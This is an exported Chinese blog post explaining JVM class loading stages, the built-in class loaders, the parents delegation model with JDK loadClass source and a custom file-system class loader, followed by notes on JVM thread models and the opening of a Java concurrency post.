<p><img src="https://qiniu.xiaoming.net.cn/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B.png" alt="类加载过程"></p>
<blockquote>
<p>类的生命周期还要加上<strong>使用</strong>和<strong>卸载</strong>两个过程</p>
</blockquote>
<h3 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h3><p>类加载过程的第一步，主要完成下面3件事情：</p>
<ul>
<li>通过全类名获取定义此类的二进制字节流</li>
<li>将字节流所代表的静态存储结构转换为方法区的运行时数据结构</li>
<li>在内存中生成一个代表该类的 Class 对象,作为方法区这些数据的访问入口</li>
</ul>
<p>虚拟机规范对上面这3点的描述并不具体，因此是非常灵活的。比如：“通过全类名获取定义此类的二进制字节流”并没有指明具体从哪里获取、怎样获取。比如：比较常见的就是从<code>ZIP</code>包中读取（日后出现的<code>JAR</code>、<code>EAR</code>、<code>WAR</code>格式的基础）、其他文件生成（典型应用就是<code>JSP</code>）等等。主要有以下几种方式：</p>
<ul>
<li>从ZIP包读取，成为JAR、EAR、WAR格式的基础</li>
<li>从网络中获取，最典型的应用是<code>Applet</code></li>
<li>运行时计算生成，例如动态代理技术，在<code>java.lang.reflect.Proxy</code>使用<code>ProxyGenerator.generatorProxyClass</code>的代理类的二进制字节流</li>
<li>由其他文件生成，例如由JSP文件生成对应的Class类</li>
</ul>
<p>一个非数组类的加载阶段（加载阶段获取类的二进制字节流的动作）是可控性最强的阶段，这一步我们可以去完成还可以自定义类加载器去控制字节流的获取方式（重写一个类加载器的<code>loadClass()</code>方法）。<strong>数组类型不通过类加载器创建，它由Java虚拟机直接创建。</strong></p>
<p><strong>加载阶段和连接阶段的部分内容是交叉进行的，加载阶段尚未结束，连接阶段可能就已经开始了。</strong></p>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p><img src="https://qiniu.xiaoming.net.cn/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B%E9%AA%8C%E8%AF%81.png" alt="类加载过程验证"></p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>准备阶段是正式为类变量分配内存并设置类变量初始值的阶段，这些内存都将在方法区中分配。对于该阶段有以下几点需要注意：</p>
<p><strong>这时候进行内存分配的仅包括类变量（<code>static</code>），而不包括实例变量，实例变量会在对象实例化时随着对象一块分配在Java堆中</strong>。</p>
<blockquote>
<p>实例化不是类加载的一个过程，类加载发生在所有实例化操作之前，并且类加载只进行一次，实例化可以进行多次。</p>
</blockquote>
<p>这里所设置的初始值”通常情况”下是数据类型默认的零值（如<code>0</code>、<code>0L</code>、<code>null</code>、<code>false</code>等），比如我们定义了<code>public static int value=111</code>，<strong>那么<code>value</code>变量在准备阶段的初始值就是0而不是111（初始化阶段才会复制）</strong>。</p>
<p>特殊情况：<strong>比如给<code>value</code>变量加上了<code>fianl</code>关键字<code>public static final int value=111</code>，那么准备阶段<code>value</code>的值就被复制为111。</strong></p>
<p>基本数据类型的零值：</p>
<p><img src="https://qiniu.xiaoming.net.cn/%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E9%9B%B6%E5%80%BC.png" alt="基本数据类型的零值"></p>
<h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程。解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用限定符7类符号引用进行。</p>
<p>符号引用就是一组符号来描述目标，可以是任何字面量。直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。在程序实际运行时，只有符号引用是不够的，举个例子：在程序执行方法时，系统需要明确知道这个方法所在的位置。Java 虚拟机为每个类都准备了一张方法表来存放类中所有的方法。当需要调用一个类的方法的时候，只要知道这个方法在方发表中的偏移量就可以直接调用该方法了。通过解析操作符号引用就可以直接转变为目标方法在类中方法表的位置，从而使得方法可以被调用。</p>
<p>综上，解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程，也就是得到类或者字段、方法在内存中的指针或者偏移量。</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>初始化是类加载的最后一步，也是真正执行类中定义的 Java 程序代码(字节码)，初始化阶段是执行类构造器<code>&lt;clinit&gt; ()</code>方法的过程。</p>
<p>初始化阶段是虚拟机执行类构造器<code>&lt;clinit&gt;()</code>方法的过程。在准备阶段，类变量已经赋过一次系统要求的初始值，而在初始化阶段，根据程序员通过程序制定的主观计划去初始化类变量和其它资源。</p>
<p><code>&lt;clinit&gt;()</code>是由编译器自动收集类中所有类变量的赋值动作和静态语句块中的语句合并产生的，编译器收集的顺序由语句在源文件中出现的顺序决定。特别注意的是，<strong>静态语句块只能访问到定义在它之前的类变量，定义在它之后的类变量只能赋值，不能访问</strong>。另外，由于父类的<code>&lt;clinit&gt;()</code>方法先执行，也就意味着父类中定义的静态语句快的执行要优先于子类。</p>
<p>接口中不可以使用静态语句块，但仍然有类变量初始化的赋值操作，因此接口与类一样都会生成<code>&lt;clinit&gt;()</code>方法。但接口与类不同的是，执行接口的<code>&lt;clinit&gt;()</code>方法不需要先执行父接口的<code>&lt;clinit&gt;()</code>方法。只有当父接口中定义的变量使用时，父接口才会初始化。另外，接口的实现类在初始化时也一样不会执行接口的<code>&lt;clinit&gt;()</code>方法。</p>
<p>对于<code>&lt;clinit&gt;（）</code>方法的调用，虚拟机会自己确保其在多线程环境中的安全性。因为 <code>&lt;clinit&gt;（）</code>方法是带锁线程安全，所以在多线程环境下进行类初始化的话可能会引起死锁，并且这种死锁很难被发现。</p>
<p>对于初始化阶段，虚拟机严格规范了有且只有5种情况下，必须对类进行初始化：</p>
<ol>
<li>当遇到<code>new</code>、<code>getstatic</code>、<code>putstatic</code>或<code>invokestatic</code>这4条字节码指令时，（常见的生成这4条指令的场景有：<code>new</code>一个类，读取一个静态字段(未被<code>final</code>修饰)、或调用一个类的静态方法时）。</li>
<li>使用<code>java.lang.reflect</code>包的方法对类进行反射调用时，如果类没初始化，需要触发其初始化。</li>
<li>初始化一个类，如果其父类还未初始化，则先触发该父类的初始化。</li>
<li>当虚拟机启动时，用户需要定义一个要执行的主类 (包含<code>main</code>方法的那个类)，虚拟机会先初始化这个类。</li>
<li>当使用 JDK1.7 的动态语言时，如果一个<code>MethodHandle</code>实例的最后解析结构为<code>REF_getStatic</code>、<code>REF_putStatic</code>、<code>REF_invokeStatic</code>的方法句柄，并且这个句柄没有初始化，则需要先触发器初始化。</li>
</ol>
<p>以上5种情况的行为称为对一个类进行<strong>主动引用</strong>。<strong>除此之外，所有引用类的方式都不会触发初始化，称为被动引用</strong>。被动引用的常见例子包括：</p>
<ul>
<li><p>通过子类引用父类的静态字段，不会导致子类初始化。</p>
</li>
<li><p>通过数组定义来引用类，不会触发此类的初始化。该过程会对数组类进行初始化，数组类是一个由虚拟机自动生成的、直接继承自<code>Object</code>的子类，其中包含了数组的属性和方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SuperClass[] sca = <span class="keyword">new</span> SuperClass[<span class="number">10</span>];</span><br></pre></td></tr></table></figure>
</li>
<li><p>常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(ConstClass.HELLOWORLD);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="2、类加载器"><a href="#2、类加载器" class="headerlink" title="2、类加载器"></a>2、类加载器</h2><p>两个类相等，需要类本身相等，并且使用同一个类加载器进行加载。这是因为每一个类加载器都拥有一个独立的类名称空间。</p>
<p>这里的相等，包括类的 Class 对象的<code>equals()</code>方法、<code>isAssignableFrom()</code>方法、<code>isInstance()</code>方法的返回结果为true，也包括使用<code>instanceof</code>关键字做对象所属关系判定结果为true。</p>
<p>所有的类都是由类加载器加载，JVM中内置了三个重要的<code>ClassLoader</code>,除了<code>BootstrapClassLoader</code>,其他类加载器均由Java实现且全部继承自<code>java.lang.ClassLoader</code>:</p>
<ul>
<li><code>BootstrapClassLoader</code>(启动类加载器):最顶层的加载器，由C++实现，负责加载<code>%JAVA_HOME%/lib</code>目录下的jar包和类或者被<code>-Xbootclasspath</code>参数指定的路径中的所有类。类必须是虚拟机识别的（仅按照文件名识别，如<code>rt.jar</code>，名字不符合的类库即使放在<code>lib</code>目录中也不会被加载）。启动类加载器无法被 Java 程序直接引用，用户在编写自定义类加载器时，如果需要把加载请求委派给启动类加载器，直接使用<code>null</code>代替即可。</li>
<li><code>ExtensionClassLoader</code>(扩展类加载器)：这个类加载器是由<code>ExtClassLoader</code>(<code>sun.misc.Launcher$ExtClassLoader</code>)实现的。主要负责加载目录<code>%JRE_HOME%/lib/ext</code>目录下的jar包和类，或被<code>java.ext.dirs</code>系统变量所指定的路径下的jar包。</li>
<li><code>AppClassLoader</code>(应用程序类加载器)：这个类加载器由<code>AppClassLoader</code>(<code>sun.misc.Launcher$AppClassLoader</code>)实现的。由于这个类加载器是<code>ClassLoader</code>中的<code>getSystemClassLoader()</code>方法的返回值，因此一般称为系统类加载器。这是面向我们用户的加载类，负责加载当前应用的<code>classpath</code>下的所有jar包和类。如果程序没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。</li>
</ul>
<h2 id="3、双亲委派模型"><a href="#3、双亲委派模型" class="headerlink" title="3、双亲委派模型"></a>3、双亲委派模型</h2><p>应用程序是由三种类加载器相互配合从而实现类加载，除此之外还可以加入自己定义的类加载器。</p>
<p>下图展示了类加载器之间的层次关系，称为双亲委派模型（Parents Delegation Model）。该模型要求除了顶层的启动类加载器外，其它的类加载器都要有自己的父类加载器。这里的父子关系一般通过组合关系（Composition）来实现，而不是继承关系（Inheritance）。</p>
<p><img src="https://qiniu.xiaoming.net.cn/%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B1.png" alt="双亲委派模型1"></p>
<p>每一个类都有一个对应它的类加载器。系统中的<code>ClassLoder</code>在协同工作的时候会默认使用<strong>双亲委派模型</strong>。即在类加载的时候，系统会首先判断当前类是否被加载过。已经被加载的类会直接返回，否则才会尝试加载。加载的时候，首先会把该请求委派该父类加载器的<code>loadClass()</code>处理，因此所有的请求最终都应该传送到顶层的启动类加载器<code>BootstrapClassLoader</code>中。当父类加载器无法处理时，才由自己来处理。当父类加载器为<code>null</code>时，会使用启动类加载器<code>BootstrapClassLoader</code>作为父类加载器。</p>
<p><img src="https://qiniu.xiaoming.net.cn/%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B2.png" alt="双亲委派模型"></p>
<p><img src="https://csn.damyoung.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy91WlRQMzZtbWVjRE5tUWt4V3poN0R1bWRQWVpDc1B0VU8yMWliU0RSQ3NBUm1FVUdWR0ZQUTg3bW13NVFsR0t2Q2ExcjNQS0FrZ3B0ZnprdGNvQzBXNmcvNjQwP3d4X2ZtdD1wbmc" alt="img"></p>
<p>从上图中我们就更容易理解了，当一个Hello.class这样的文件要被加载时。不考虑我们自定义类加载器，首先会在AppClassLoader中<strong>检查是否加载过</strong>，如果有那就无需再加载了。如果没有，那么会拿到<strong>父加载器</strong>，然后调用父加载器的<strong>loadClass</strong>方法。父类中同理会先检查自己是否已经加载过，如果没有再往上。注意这个过程，知道到达<strong>Bootstrap classLoader</strong>之前，都是没有哪个加载器自己选择加载的。如果父加载器无法加载，会下沉到子加载器去加载，一直到最底层，如果没有任何加载器能加载，就会抛出<strong>ClassNotFoundException</strong>。</p>
<h3 id="为什么要设计这种机制"><a href="#为什么要设计这种机制" class="headerlink" title="为什么要设计这种机制"></a>为什么要设计这种机制</h3><p>这种设计有个好处是，如果有人想替换系统级别的类：String.java。篡改它的实现，但是在这种机制下这些系统的类已经被Bootstrap classLoader加载过了，所以并不会再去加载，从一定程度上防止了危险代码的植入。每个类加载都有一个父类加载器，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ClassLodarDemo&#x27;s ClassLoader is &quot;</span> + ClassLoaderDemo.class.getClassLoader());</span><br><span class="line">        System.out.println(<span class="string">&quot;The Parent of ClassLodarDemo&#x27;s ClassLoader is &quot;</span> + ClassLoaderDemo.class.getClassLoader().getParent());</span><br><span class="line">        System.out.println(<span class="string">&quot;The GrandParent of ClassLodarDemo&#x27;s ClassLoader is &quot;</span> + ClassLoaderDemo.class.getClassLoader().getParent().getParent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ClassLodarDemo&#39;s ClassLoader is sun.misc.Launcher$AppClassLoader@18b4aac2</span><br><span class="line">The Parent of ClassLodarDemo&#39;s ClassLoader is sun.misc.Launcher$ExtClassLoader@1b6d3586</span><br><span class="line">The GrandParent of ClassLodarDemo&#39;s ClassLoader is null</span><br></pre></td></tr></table></figure>

<p><code>AppClassLoader</code>的父类加载器为<code>ExtClassLoader</code>。<code>ExtClassLoader</code>的父类加载器为<code>null</code>,**null并不代表其没有父类加载器，而是<code>BootstrapClassLoader</code>**。</p>
<h3 id="双亲委派模型实现源码分析"><a href="#双亲委派模型实现源码分析" class="headerlink" title="双亲委派模型实现源码分析"></a>双亲委派模型实现源码分析</h3><p>双亲委派模型的实现源码都集中在<code>java.lang.ClassLoader</code>的<code>loadClass()</code>中，相关代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于委托的父类加载器</span></span><br><span class="line"><span class="comment">// 注意:VM硬编码了这个字段的偏移量，因此所有的新字段都必须在它之后添加。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ClassLoader parent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// 首先检查请求的类是否已经被加载过</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;   <span class="comment">//父类加载器不为空，调用父类加载器的loadClass()方法处理</span></span><br><span class="line">                    c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;    <span class="comment">//父类加载器空，使用启动类加载器BootstrapClassLoader加载</span></span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// 抛出异常说明父类加载器无法完成加载请求</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="双亲委派模型的好处"><a href="#双亲委派模型的好处" class="headerlink" title="双亲委派模型的好处"></a>双亲委派模型的好处</h3><p>双亲委派模型保证了Java程序的稳定运行，可以避免类的重复加载（JVM 区分不同类的方式不仅仅根据类名，相同的类文件被不同的类加载器加载产生的是两个不同的类），也保证了 Java 的核心 API 不被篡改。如果没有使用双亲委派模型，而是每个类加载器加载自己的话就会出现一些问题，比如我们编写一个称为<code>java.lang.Object</code> 类的话，那么程序运行的时候，系统就会出现多个不同的 Object 类。</p>
<p>例如<code>java.lang.Object</code>存放在<code>rt.jar</code>中，如果编写另外一个<code>java.lang.Object</code>并放到<code>ClassPath</code>中，程序可以编译通过。由于双亲委派模型的存在，所以在<code>rt.jar</code>中的<code>Object</code>比在<code>ClassPath</code>中的<code>Object</code>优先级更高，这是因为<code>rt.jar</code>中的<code>Object</code>使用的是启动类加载器，而<code>ClassPath</code>中的<code>Object</code>使用的是应用程序类加载器。<code>rt.jar</code>中的<code>Object</code>优先级更高，那么程序中所有的<code>Object</code>都是这个<code>Object</code>。</p>
<h3 id="如果不想使用双亲委派模型怎么办"><a href="#如果不想使用双亲委派模型怎么办" class="headerlink" title="如果不想使用双亲委派模型怎么办"></a>如果不想使用双亲委派模型怎么办</h3><p>为了避免双亲委派机制，可以自己定义一个类加载器，然后重载<code>loadClass()</code>方法</p>
<h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p>除了<code>BootstrapClassLoader</code>，其他类加载器均由Java实现且全部继承自<code>java.lang.ClassLoader</code>。如果要自定义类加载器，需要继承<code>ClassLoader</code>抽象类.</p>
<p>以下代码中的<code>FileSystemClassLoader</code>是自定义类加载器，继承自<code>java.lang.ClassLoader</code>，用于加载文件系统上的类。它首先根据类的全名在文件系统上查找类的字节代码文件（<code>.class</code>文件），然后读取该文件内容，最后通过<code>defineClass()</code>方法来把这些字节代码转换成<code>java.lang.Class</code>类的实例。</p>
<p><code>java.lang.ClassLoader</code>的<code>loadClass()</code>实现了双亲委派模型的逻辑，自定义类加载器一般不去重写它，但是需要重写<code>findClass()</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileSystemClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String rootDir;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FileSystemClassLoader</span><span class="params">(String rootDir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.rootDir = rootDir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] classData = getClassData(name);</span><br><span class="line">        <span class="keyword">if</span> (classData == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(name, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] getClassData(String className) &#123;</span><br><span class="line">        String path = classNameToPath(className);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InputStream ins = <span class="keyword">new</span> FileInputStream(path);</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">int</span> bufferSize = <span class="number">4096</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[bufferSize];</span><br><span class="line">            <span class="keyword">int</span> bytesNumRead;</span><br><span class="line">            <span class="keyword">while</span> ((bytesNumRead = ins.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, bytesNumRead);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">classNameToPath</span><span class="params">(String className)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rootDir + File.separatorChar</span><br><span class="line">                + className.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="1、JVM是如何实现线程的？"><a href="#1、JVM是如何实现线程的？" class="headerlink" title="1、JVM是如何实现线程的？"></a>1、JVM是如何实现线程的？</h2><p>线程是比进程更轻量级的调度执行单位，线程的引入，可以把一个进程的资源分配和执行调度分开，各个线程可既可以共享进程资源（内存地址、文件I/O等），又可以独立调度（线程是CPU调度的基本单位）</p>
<p>主流操作系统都提供了线程的实现，Java线程的关键方法都是声明 <code>Native</code>，所以是直接使用了平台相关的方法去创建线程</p>
<p>JVM实现线程的方式主要有3种：</p>
<h3 id="使用内核线程"><a href="#使用内核线程" class="headerlink" title="使用内核线程"></a>使用内核线程</h3><p>内核线程（Kernel-Level Thread KLT） 就是直接由操作系统内核支持的线程，这种线程由内核来完成线程的切换。</p>
<p>内核通过操纵调度器 Scheduler 对线程进行调度，并负责将线程的任务映射到各个处理器上。</p>
<p>每个内核线程都可以视为内核的一个分身。</p>
<p>支持多线程的内核叫做多线程内核。</p>
<p>程序一般不会直接去使用内核线程，而是去使用内核线程的一种高级接口——轻量级进程（Light Weight Process LWP）,轻量级进程就是我们通常意义上所讲的线程，由于每个轻量级进程都由一个内核线程支持，因此只有先支持内核线程，才能有轻量级进程。轻量级进程与内核线程之间1：1的关系成为一对一线程模型。</p>
<p>局限性：</p>
<ul>
<li>基于内核线程实现，线程操作（创建，析构、同步）都需要系统调用，代价相对比较高，需在用户态（User Mode）和内核态(Kernel Mode)中来回切换</li>
<li>需要消耗内核资源（如内核的栈空间）</li>
</ul>
<h3 id="使用用户线程"><a href="#使用用户线程" class="headerlink" title="使用用户线程"></a>使用用户线程</h3><p>广义上面讲，一个线程只要不是内核线程，就可以认为是用户线程</p>
<p>从定义上讲，轻量级进程也属于用户线程，但轻量级进程的实现始终是建立在内核之上的，许多操作都要进行系统调用，效率会受到限制</p>
<p>狭义上面讲，完全建立在用户空间的线程库上，系统内核不能感知线程存在的实现</p>
<p>用户线程的建立、同步、销户和调度完全在用户态中完成，不需要内核的帮助</p>
<p>如果程序实现得当，这种线程不需要切换到内核态，因此操作可以是非常快速且低消耗的，也可以支持规模更大的线程数量，部分高性能数据库中的多线程就是由用户线程实现的</p>
<p>这种进程与用户线程之间1：N的关系称为一对多的线程模型</p>
<ul>
<li>优势：不需要内核支援</li>
<li>劣势：没有系统内核的支援，所有的线程操作都需要用户程序自己处理，包括线程的创建、切换和调度，阻塞如何处理，如何将线程映射到其他处理器上。因为用户线程实现程序比较复杂，所以使用用户线程的程序越来越少</li>
</ul>
<h3 id="使用用户线程加轻量级进程混合实现"><a href="#使用用户线程加轻量级进程混合实现" class="headerlink" title="使用用户线程加轻量级进程混合实现"></a>使用用户线程加轻量级进程混合实现</h3><p>用户线程还是完全建立在用户空间中，因此用户线程的创建、切换、析构等操作依然廉价，并且可以支持大规模的用户线程并发。</p>
<p>轻量级进程作为桥梁，可以使用内核提供线程调度功能以及处理器映射功能，并且用户线程的系统调用要通过轻量级线程来完成，大大降低了整个进程被完全阻塞的风险。</p>
<p>这种关系为N:M关系，多对多的线程模型</p>
<h3 id="JAVA线程的实现"><a href="#JAVA线程的实现" class="headerlink" title="JAVA线程的实现"></a>JAVA线程的实现</h3><p>操作系统支持怎么样的线程模型，在很大的程度上决定了 Java 虚拟机上的线程是怎么样映射的。</p>
<p>线程调度是系统为线程分配处理器使用权的过程。</p>
<h4 id="协同式线程调度"><a href="#协同式线程调度" class="headerlink" title="协同式线程调度"></a>协同式线程调度</h4><p>线程的执行时间由线程本身控制，线程把自己的工作执行完，主动通知系统切换到另外一个线程</p>
<p>好处：</p>
<ul>
<li>实现简单</li>
<li>切换操作堆线程自己是可知的，所以没有什么线程同步问题</li>
</ul>
<p>坏处：</p>
<ul>
<li>线程执行时间不可控制，如果一个线程编写有问题，那程序一直会阻塞在那里</li>
</ul>
<h4 id="抢占式线程调度（JAVA线程实现方式）"><a href="#抢占式线程调度（JAVA线程实现方式）" class="headerlink" title="抢占式线程调度（JAVA线程实现方式）"></a>抢占式线程调度（JAVA线程实现方式）</h4><p>线程的切换不由线程本身来做决定，每个线程由系统来分配执行时间，不会有线程导致整个进程阻塞的问题。</p>
<p>好处：</p>
<ul>
<li>执行时间是可控的，不会有一个线程导致整个进程阻塞</li>
<li>使用优先级来建议系统对某个线程多分配执行时间</li>
</ul>
<p>java语言提供了10个级别的线程优先级，但是并不能完全依靠线程优先级。因为Java的线程是被映射到系统的原生线程上，所以线程调度最终还是由操作系统说了算。如 Windows 系统中存在一个“优先级推进器”，当系统发现一个线程执行特别勤奋，可能会越过线程优先级为它分配执行时间。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java并发</title>
    <url>/2021/01/17/java%E5%B9%B6%E5%8F%91/</url>
    <content><![CDATA[<h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="为什么使用多线程"><a href="#为什么使用多线程" class="headerlink" title="为什么使用多线程"></a>为什么使用多线程</h3><ol>
<li>线程可以比作是轻量级进程，是操作系统进行运算调度的最小单位，线程间的切换和调度成本远远小于进程。另外，多核CPU意味着多个线程可以同时运行，减少了线程上下文切换的开销</li>
<li>现在系统动不动要求百万级甚至千万级的并发量，而多线程并发编程正是开发高并发系统的基础，利用多线程机制可以大大提高系统整体的并发能力以及性能</li>
</ol>
<a id="more"></a>

<h3 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h3><p><img src="https://camo.githubusercontent.com/a66819fd82c6adfa69b368edf3c52b1fa9cdc89d/68747470733a2f2f6d792d626c6f672d746f2d7573652e6f73732d636e2d6265696a696e672e616c6979756e63732e636f6d2f323031392d332f4a564de8bf90e8a18ce697b6e695b0e68daee58cbae59f9f2e706e67" alt="java运行时内存区域"></p>
<ol>
<li>进程：操作系统进行分配和调度的基本单位，进程是线程的容器，是程序的实体，拥有独立的内存空间</li>
<li>线程：操作系统进行运算调用的最小单位，与其他线程共享内存空间</li>
</ol>
<p>多个线程共享进程的堆空间和方法区(jdk1.8使用原空间)，但是每个线程拥有自己私有的虚拟机栈、程序计数器、本地方法栈</p>
<ul>
<li>堆是进程中最大的一块内存空间，主要用于存放新建的对象(大部分对象都在这里分配内存)</li>
<li>方法区主要用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等</li>
</ul>
<p>进程和线程最大的区别是基本上各个进程间都是独立的，而线程则不一定，同一进程中不同线程之间可能相互影响。线程执行开销小，但不利于资源的管理和保护，而进程则相反。</p>
<h3 id="并行和并发"><a href="#并行和并发" class="headerlink" title="并行和并发"></a>并行和并发</h3><p>并行parallel：多个cpu同时执行不同的任务</p>
<p>并发concurrent：由同一个cpu的任务调度器完成，轮流执行</p>
<h3 id="线程调度模型"><a href="#线程调度模型" class="headerlink" title="线程调度模型"></a>线程调度模型</h3><p>分时调度模型：所有线程轮流使用cpu，平均分配每个线程占用cpu的时间片</p>
<p>抢占式调度模型：优先级高的线程使用cpu，优先级相同线程由任务调度器随机选择一个，(JVM)</p>
<h2 id="创建线程三种方式"><a href="#创建线程三种方式" class="headerlink" title="创建线程三种方式"></a>创建线程三种方式</h2><blockquote>
<p>线程<strong>运行</strong>需要<code>run()</code>方法，编写线程操作，<code>Runnable</code>接口定义了该方法，<code>Thread</code>类线程具体实现类(包括线程操作很多方法)</p>
<p><strong>启动</strong>一个线程需要<code>start()</code>方法，定义于<code>Thread</code>类</p>
</blockquote>
<h3 id="继承Thread类"><a href="#继承Thread类" class="headerlink" title="继承Thread类"></a>继承Thread类</h3><blockquote>
<p>由于继承线程类<code>Thread</code>，创建该类实例，即创建了线程对象</p>
</blockquote>
<p><code>Thread</code>是<code>Runnable</code>的实现类，同样需要实现<code>run()</code>方法</p>
